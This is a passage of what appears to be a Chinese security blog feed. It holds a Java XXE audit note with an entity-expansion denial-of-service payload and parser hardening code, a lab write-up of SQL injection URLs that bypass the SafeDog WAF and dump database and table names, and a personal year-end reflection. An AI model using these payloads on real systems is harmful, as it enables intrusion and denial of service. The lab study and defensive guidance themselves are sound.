class="meta-keyword">e4</span> <span class="meta-string">"&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e5</span> <span class="meta-string">"&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;&amp;e4;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e6</span> <span class="meta-string">"&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;&amp;e5;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e7</span> <span class="meta-string">"&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;&amp;e6;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e8</span> <span class="meta-string">"&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;&amp;e7;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e9</span> <span class="meta-string">"&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;&amp;e8;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e1</span>0 <span class="meta-string">"&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;&amp;e9;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">e11</span> <span class="meta-string">"&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;&amp;e10;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span>&amp;e11;<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp; &lt;x&gt;&e11;&lt;/x&gt; 代码引用ENTITY e11，而 e11 由16 个 e10 组成，递归调用，循环次数达到 16^10 的规模。循环大量的实体引用，会消耗大量的CPU资源，长时间显示占用近100%。</p><p>&emsp;&emsp; POIXMLTypeLoader 中，解析xml的时候直接读取xml，没有对实体的数量进行限制。3.11 对 POIXMLTypeLoader 中的实体大小进行了限制 ，最大为4096，但是当实体为空的时候（如上例），还是可以构造空实体，形成大量循环，占用 cpu 资源，造成拒绝服务攻击。</p><hr><h1 id="xlsx-streamer-XXE"><a href="#xlsx-streamer-XXE" class="headerlink" title="xlsx-streamer XXE"></a>xlsx-streamer XXE</h1><p>&emsp;&emsp; xlsx-streamer XXE漏洞与Poi ooxml XXE类似，具体查看<a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">参考链接</a>笔者这里就不过多的叙述了。</p><hr><h1 id="代码审计技巧"><a href="#代码审计技巧" class="headerlink" title="代码审计技巧"></a>代码审计技巧</h1><p><strong>查找关键字</strong></p><pre><code>javax.xml.parsers.DocumentBuilderFactory;javax.xml.parsers.SAXParserjavax.xml.transform.TransformerFactoryjavax.xml.validation.Validatorjavax.xml.validation.SchemaFactoryjavax.xml.transform.sax.SAXTransformerFactoryjavax.xml.transform.sax.SAXSourceorg.xml.sax.XMLReaderorg.xml.sax.helpers.XMLReaderFactoryorg.dom4j.io.SAXReaderorg.jdom.input.SAXBuilderorg.jdom2.input.SAXBuilderjavax.xml.bind.Unmarshallerjavax.xml.xpath.XpathExpressionjavax.xml.stream.XMLStreamReaderorg.apache.commons.digester3.Digester…………</code></pre><hr><h1 id="XXE防御"><a href="#XXE防御" class="headerlink" title="XXE防御"></a>XXE防御</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般的防护</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xinclude防护</span></span><br><span class="line">dbf.setXIncludeAware(<span class="keyword">true</span>);   <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setNamespaceAware(<span class="keyword">true</span>);  <span class="comment">// 支持XInclude</span></span><br><span class="line">            dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>, <span class="keyword">true</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>, <span class="keyword">false</span>);</span><br><span class="line">            dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><hr><h1 id="推荐案例"><a href="#推荐案例" class="headerlink" title="推荐案例"></a>推荐案例</h1><p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">收集了很多国内外知名厂商出现案例</a><br><a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">基础知识文章XXE</a><br><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">XXE更多骚操作</a><br><a href="https://xz.aliyun.com/t/2448" target="_blank" rel="noopener">Apache Solr XXE漏洞分析 -【CVE-2018-8026 】</a></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_40918067/article/details/90950535" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40918067/article/details/90950535</a><br><a href="https://github.com/JoyChou93/java-sec-code/wiki/XXE" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/wiki/XXE</a><br><a href="https://blog.csdn.net/hua1017177499/article/details/78985166" target="_blank" rel="noopener">https://blog.csdn.net/hua1017177499/article/details/78985166</a><br><a href="https://p0rz9.github.io/2019/02/27/xxe/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/02/27/xxe/</a><br><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a><br><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">https://www.jianshu.com/p/73cd11d83c30</a><br><a href="https://www.itread01.com/hkpcyyp.html" target="_blank" rel="noopener">https://www.itread01.com/hkpcyyp.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;学习总结Java审计过程中笔记，审计方法&lt;/li&gt;
&lt;li&gt;阅读要求：有简单Java代码基础，了解漏洞原理&lt;/li&gt;
&lt;li&gt;阅
      
    
    </summary>
    
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="XXE 代码审计" scheme="http://yoursite.com/tags/XXE-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>bypass 学习笔记之绕安全狗bypass safedog</title>
    <link href="http://yoursite.com/2020/02/03/bypass%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97__bypass%20safedog/"/>
    <id>http://yoursite.com/2020/02/03/bypass%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%BB%95%E5%AE%89%E5%85%A8%E7%8B%97__bypass%20safedog/</id>
    <published>2020-02-03T04:42:16.000Z</published>
    <updated>2020-05-05T13:12:00.521Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://img-blog.csdnimg.cn/20191204193451558.png" alt="在这里插入图片描述"></p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>走上安全这条路也有9个月了，虽然中途有两个月一直在准备其他的事情，但是安全这条路一直在坚持着。<br>学习安全这么久了，从一开始的脚本小子，我也一直想转变一下，改变自己的现状，但是因为种种事情，给耽误了这个计划。<br>因为接触最多漏洞应该是SQL注入吧，所以我第一想到就是bypass SQL注入。为什么选择安全狗呢？这个waf。。。。这个是因为我遇到的最多是这个waf。<br><code>大家看完可能发现这些东西可能是参考里面差不多的，为啥我还要重新写一波？我只是单纯的想加深一下自己下印象，加深记忆。只是做为自己的学习笔记而已，大佬们不要喷。</code></p><hr><h1 id="0x00-前期准备"><a href="#0x00-前期准备" class="headerlink" title="0x00 前期准备"></a>0x00 前期准备</h1><p>虚拟机windows7<br>phpstudy<a href="https://www.xp.cn/" target="_blank" rel="noopener">^1</a>（为啥选这个我就不说了）<br><code>如果你是使用的phpstudy，请务必将sql的版本调到5.5以上，因为这样你的数据库内才会有information_schema数据库，方便进行实验测试。</code><a href="https://blog.csdn.net/sdb5858874/article/details/80727555" target="_blank" rel="noopener">^2</a><br>环境<img src="https://img-blog.csdnimg.cn/20191204203333353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>sqli-labs<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">^3</a>（我相信大家也不陌生）<br>这里下载之后要在相关地方修改一下，修改一下数据库密码。具体搭建步骤可以看<a href="https://blog.csdn.net/qq_35811830/article/details/90302307" target="_blank" rel="noopener">sqli-labs环境搭建</a>这里就不多做叙述。<br><img src="https://img-blog.csdnimg.cn/20191204195039251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 id="0x01-开始尝试绕开"><a href="#0x01-开始尝试绕开" class="headerlink" title="0x01 开始尝试绕开"></a>0x01 开始尝试绕开</h1><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><code>内联绕过</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%27&#x2F;*!14440order by*&#x2F; 3-- +</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204195703439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%27&#x2F;*!10450order%20by*&#x2F;%203--%20+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204202830345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>经过自己短暂Fuzz之后发现<br>?id=1%27/<em>!<code>10450</code>order%20by</em>/%203–%20+<br>内联其中的10450这个数值不一样，safedog 拦截情况不一样。（这个情况我也不是很清楚是为啥，因为我也不懂MySQL的查询原理。如果有大佬知道可以评论说明一下，小的不甚感激！）<br><img src="https://img-blog.csdnimg.cn/20191204212827898.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191204202935900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>注释</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;1%20order%23by%203%20--+</span><br></pre></td></tr></table></figure><p>无意中我发现原文中写的是注释换行，但我发现不用换行也能绕过。<br><code>1%20order%23by%203%20--+</code> 区别在%23后面加%0A。</p><p><img src="https://img-blog.csdnimg.cn/20191204204251572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p><code>union select</code><br>经过不断Fuzz<a href="推荐一个不断Fuzz的文章，在此我就不多累赘了。https://blog.csdn.net/q1352483315/article/details/90175002">^4</a>,你会发现狗只会咬select这个字，不会考虑union。<br><img src="https://img-blog.csdnimg.cn/20191204204922648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>内联</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20&#x2F;*!10440select*&#x2F;%201,2,3%20--+</span><br></pre></td></tr></table></figure><p>参考文章是连union也内联注释了一下。<br><img src="https://img-blog.csdnimg.cn/20191204203631472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>注释+垃圾字符</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%230%0Aselect%201,2,3%20--+</span><br></pre></td></tr></table></figure><p>垃圾字符可以多点，字符无所谓是什么，最少要一个，亲测。<br><img src="https://img-blog.csdnimg.cn/20191204211435175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20191204211158654.png" alt="在这里插入图片描述"></p><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><p>下面就不一一截图了，不然篇幅太长了。<br><code>获取数据库名</code><br>查当前数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大佬骚操作</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20all--+x%0Aselect%201,2,database&#x2F;*!00000()*&#x2F;--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这个是我自己结合前面的Fuzz出来操作</span><br><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%23a%0Aselect%201,2,database%23%0A()--+</span><br></pre></td></tr></table></figure><p>差其他数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不知道为啥，我可以查到其他数据库，但在参考文章中是不可能的，玄学。</span><br><span class="line">http:&#x2F;&#x2F;192.168.116.130:8001&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20%23asdasdasd%0a%20select%201,(select%20schema_name%20from%20%23%0ainformation_schema.schemata%20%20limit%202,1),3%20--%20+</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191204213813597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p><code>获取表名</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1%27%20union%20all--+x%0Aselect%201,2,group_concat(table_name)from%20sys.schema_auto_increment_columns%20where%20table_schema&#x3D;database&#x2F;*!&#x2F;*%23*&#x2F;*&#x2F;()--+</span><br></pre></td></tr></table></figure><hr><h1 id="0x03-配合使用分块传输插件bypass-dogwaf"><a href="#0x03-配合使用分块传输插件bypass-dogwaf" class="headerlink" title="0x03 配合使用分块传输插件bypass dogwaf"></a>0x03 配合使用分块传输插件bypass dogwaf</h1><p>之前偶尔看到了分块传输插件，可以过很多waf。今天得以试试。<br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzEyLzE0L1FSSkNKMS5wbmc?x-oss-process=image/format,png" alt="QRJCJ1.png"><br><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9zMi5heDF4LmNvbS8yMDE5LzEyLzE0L1FSSm1vZC5wbmc?x-oss-process=image/format,png" alt="QRJmod.png"><br><img src="https://img-blog.csdnimg.cn/20191214151418588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>未完待续</p><hr><h1 id="Reference-Resources"><a href="#Reference-Resources" class="headerlink" title="Reference Resources"></a>Reference Resources</h1><p><a href="https://www.anquanke.com/post/id/188465" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188465</a><br><a href="https://422926799.github.io/posts/aafbd292.html" target="_blank" rel="noopener">https://422926799.github.io/posts/aafbd292.html</a><br><a href="https://www.chabug.org/web/1019.html" target="_blank" rel="noopener">https://www.chabug.org/web/1019.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20191204193451558.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="bypass" scheme="http://yoursite.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>回望1920 AND 畅想2020</title>
    <link href="http://yoursite.com/2019/12/26/%E5%9B%9E%E6%9C%9B2019%20AND%20%E7%95%85%E6%83%B32020/"/>
    <id>http://yoursite.com/2019/12/26/%E5%9B%9E%E6%9C%9B2019%20AND%20%E7%95%85%E6%83%B32020/</id>
    <published>2019-12-26T11:01:42.000Z</published>
    <updated>2020-05-05T13:16:52.067Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="契机"><a href="#契机" class="headerlink" title="契机"></a>契机</h1><p><img src="https://img-blog.csdnimg.cn/20191226164253999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p>&emsp; 一个读者，加了我QQ一个月说加入我知识星球。作为一个菜鸡，知识星球就是用来分享和自己储存一点文件和知识点地方。并没有很多的干货，为了表示一下，和他进行了深入的交流和沟通。深入了解之后，他说：师傅有时间你把你立FLAG整理告诉我，我想挑战一下。</p><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p><img src="https://img-blog.csdnimg.cn/20191226164339383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>&#8195; 通常我写文章，需要两个条件：</p><ul><li>一个契机</li><li>时间充沛<br>现在契机有了，时间在准备一个学期的后期课程比较少，所以时间也有了。<br>这篇文章筹划了很久，毕竟是我个人第一次想写的年度总结报告，没有任何压力，只是单纯的想总结回顾一下自己一年来所作所为而已。无论你觉得你我是在作秀，还是觉得我在装逼，我只有一句话回复你：我只想做我自己想做的事情。其实写过文章的人都知道，一篇文章从开始动手到最终定稿时，中间会反反复复修改很多次。其实我写文章，就是在脑子从重新回顾一下我的前半生吧，或许这才是我内心的答案吧。一边写这篇文章的时候，总是一边在回忆过往。</li></ul><p><code>思前想后，决定还是以时间线为线索展开。</code></p><hr><h1 id="结缘黑客"><a href="#结缘黑客" class="headerlink" title="结缘黑客"></a>结缘黑客</h1><hr><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyLzk3YjY1M2EyMDk4MzZiNjI5NWYwOThiNTI3Mjk1NmFkX3N0YWZmXzEwMjQxLTMwMHgyMDcuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195;朦胧少年时，看了一部电影《黑客帝国》，此次不可救药的迷上黑客题材的电影，这也是我第一次对黑客这个职业有了朦胧的认知，从那以后我便心里萌发出，长大成为一名黑客的种子。</p><p>&#8195;虽然从那时候我便开始找各种资料，方式途径想要更深入了解黑客这方面的东西，知识。四处碰壁，四处被骗，交了各种智商税。玩过卡盟，葫芦侠……上了高中之后，还去淘宝上求着我姐帮我买了一本C primer plus当时商家还送了一本C++版的，花了二三十块钱（之后再也没找不到商家了）。书到之后，我打开看了，当时一点都不懂，那本书的字号很小，书很厚（7百多页，上了大学之后才知道这本书是被誉为C语言经典教材）作为一名刚上高中的学生哪里有耐心看，也看不懂。当时打开看了一两页之后只是简单解释说明C语言的发展历程，当时身边也没有任何认识的上过大学之类的，身边亲戚朋友的学历都不是很高。所以这个一时兴起的计划被搁置了。</p><hr><h1 id="认知网安"><a href="#认知网安" class="headerlink" title="认知网安"></a>认知网安</h1><hr><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyLzJiM2NlZmU3ZmU0ZTkxYTg1ZWRkYWRiZWZmZTY1YWYzX3N0YWZmXzEwMjQxLTMwMHgyMjYuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195; 从结缘黑客到认知网安安全经历很长的一段时间，大概有6年左右的时间间隔吧。6年间不断地关注着，尽我一切可能性去了解更多的东西。<br>&#8195;但是真正认知网络安全是在大学开始的，那是一个大二的学长问我是否想学网络安全。我当时毫不犹豫的回答是想，在学长指导下，我先后学了Python、了解HTML、JavaScript，这个时候我已经是一名大一下学期的是学生了。在大一上个学期我学了两名语言，一个Java和C语言（专业必修）。之后过了一段时间，我当时看到学长在看学习视频，恰好看见了他百度网盘里面的资料。这也就是我刚刚开始接触网络安全这个行业起始点。</p><hr><h1 id="安全之路"><a href="#安全之路" class="headerlink" title="安全之路"></a>安全之路</h1><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzEyL2NlNzk5MzQ1MTIzNzBhNTI4ZTk0YWZhMzA0N2FlZGM0X2ludGVybGFjZTExLTMwMHgyOTAuanBn?x-oss-process=image/format,png" alt="在这里插入图片描述"><br>&#8195;起初开始学习就是看网络安全教程视频，到目前为止看的比较完整的一套视频是carcer的视频教学。我看这种视频教学有一个特点，我不喜欢慢慢的看，这也是我个人的一个习惯吧。我习惯开倍速看，我觉得培训视频中间会有教员的个人观点、经历、见解等，我觉得我这些完全可以听听就行，没有必要去深入探讨研究的。每一个人都有自己一套学习体系、学习经验，其他人的是好的但未必就适合自己。在学习路程中学会、总结、形成自己的一套行之有效的方法才是好的。<br>&#8195;我大概花了一个月的时间去看了这套视频，这套视频是一共30+集，一集是大概1-2小时。边看的过程中有些重点还是放缓播放速度去看，偶尔还写一点笔记之类的。<br>&#8195;<a href="https://blog.csdn.net/sun1318578251/article/details/93032438" target="_blank" rel="noopener">下一秒学习法</a>是我一直学习使用的方法、技巧。还是那一句话，没那么多想当然，没那么多偶然，所有的必然和偶然都是你自己一直努力的结果。</p><hr><p><img src="https://img-blog.csdnimg.cn/2019122616371354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h1><ul><li>驾照（科二挂了一次，停留在科三）<code>未完成</code></li><li>英语四级（凉了）<code>未完成</code></li><li>软考网络工程师(52,53) <code>完成</code></li><li>博客排名进10w（后来自己加）<code>完成</code></li><li>圈子社区<code>完成</code></li><li>土司社区<code>完成</code></li><li>freebuf投稿<code>未完成</code></li><li>先知投稿<code>完成</code></li><li>…<br>&#8195;其实我真的没设立太多的flag，有几个flag是我早就规划好的。比例说我驾照是我在想今年拿下的，但是我拖延症性格最终给落下了。英语四级和软考冲突了，还有一些细小的flag，有些完成了有些没完成。其实除了我自己规划好的flag其他的都是遇上就自动成为自己接下来为之奋斗的目标了。</li></ul><p><strong><em><code>新年flag</code></em></strong></p><ul><li>CSDN 博客访问量破10w挣20w成为博客专家</li><li>把2019的未完成的flag完成</li><li>暑假实习二个月（去处未定，有老板、HR看得上欢迎留言评论联系方式，我联系您）</li><li>脱单此乃人生大事</li><li>待续…其他的暂时未成想到</li></ul><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&#8195;2019年有惊喜，有遗憾，有意外，有失落。。。这些也是每一个人也有的经历吧。但是总的来说我2019对于我个人来说是一个喜大过于悲的一年，我获取了很多荣誉，同时也失去了很多东西。</p><p>&#8195;其实想写的东西很多，想和读者分享的东西有很多。一路走过来感谢喜欢我读者的朋友们，在此我想对你们说一声谢谢。让我们一起迎接2020这个特殊的一年，让我们一起奋斗吧。<br><img src="https://img-blog.csdnimg.cn/201912261636374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N1bjEzMTg1NzgyNTE=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><h1 